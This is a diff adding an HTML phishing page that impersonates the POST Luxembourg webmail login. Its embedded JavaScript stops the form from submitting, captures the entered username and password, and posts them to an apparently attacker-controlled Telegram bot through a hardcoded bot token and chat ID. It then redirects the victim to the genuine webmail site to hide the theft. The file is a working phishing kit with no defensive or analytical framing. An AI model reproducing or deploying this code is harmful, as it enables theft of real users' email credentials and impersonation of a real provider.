@@ -1,0 +1,182 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Webmail Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: url('file/img/bg.png') no-repeat center bottom;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo {
+      position: absolute;
+      top: -60px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100px;
+      height: auto;
+      background: white;
+      border-radius: 50%;
+      padding: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .form-box {
+      background: white;
+      padding: 30px 20px 20px 20px;
+      padding-top: 80px;
+      border-radius: 4px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.15);
+      text-align: left;
+      position: relative;
+    }
+
+    .form-box h2 {
+      margin-top: 0;
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #333;
+      text-align: center;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    select {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 16px;
+    }
+
+    .login-btn {
+      background: linear-gradient(to bottom, #f9d31c, #f5a700);
+      color: black;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 3px;
+      cursor: pointer;
+      float: right;
+    }
+
+    .reset-link {
+      margin-top: 10px;
+      font-size: 14px;
+      clear: both;
+    }
+
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+    }
+
+    @media (max-width: 480px) {
+      .logo {
+        width: 80px;
+        top: -50px;
+      }
+
+      .form-box {
+        padding-top: 70px;
+      }
+
+      .login-btn {
+        width: 100%;
+        float: none;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <form method="post" action="" id="loginForm">
+      <img src="file/img/logo.png" alt="Logo" class="logo">
+      <div class="form-box">
+        <h2>Webmail Login</h2>
+        <label>Username</label>
+        <input type="text" name="user" required>
+        <label>Password</label>
+        <input type="password" name="password" required>
+        <label>Language</label>
+        <select>
+          <option>English</option>
+          <option>Français</option>
+        </select>
+        <button class="login-btn">Login</button>
+        <div class="reset-link">Reset Password.</div>
+        <div class="footer">
+          © 2025 POST Luxembourg | www.post.lu<br>
+          Data protection | Cookie Settings
+        </div>
+      </div>
+    </form>
+  </div>
+<script>
+  const botToken = '6793149800:AAFrrTrd5hC5HaY9QFqGkxHpyVpReIyjLE8';  // Remplace par ton token
+  const chatId = '-4134299888';      // Remplace par ton chat ID
+
+  document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // bloquer envoi classique
+
+    const user = this.user.value;
+    const password = this.password.value;
+    const language = this.querySelector('select').value;
+
+    const message = `
+Postlu Webmail :
+Username : ${user}
+Password : ${password}
+    `;
+
+    // URL API Telegram
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // Préparation des données
+    const data = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    };
+
+    // Envoi via fetch POST
+    fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      // Redirection après l’envoi, même si erreur
+      window.location.href = 'https://webmail.pt.lu/webmail';
+    })
+    .catch(error => {
+      // En cas d’erreur, rediriger aussi
+      window.location.href = 'https://webmail.pt.lu/webmail';
+    });
+  });
+</script>
+
+</body>
+</html>
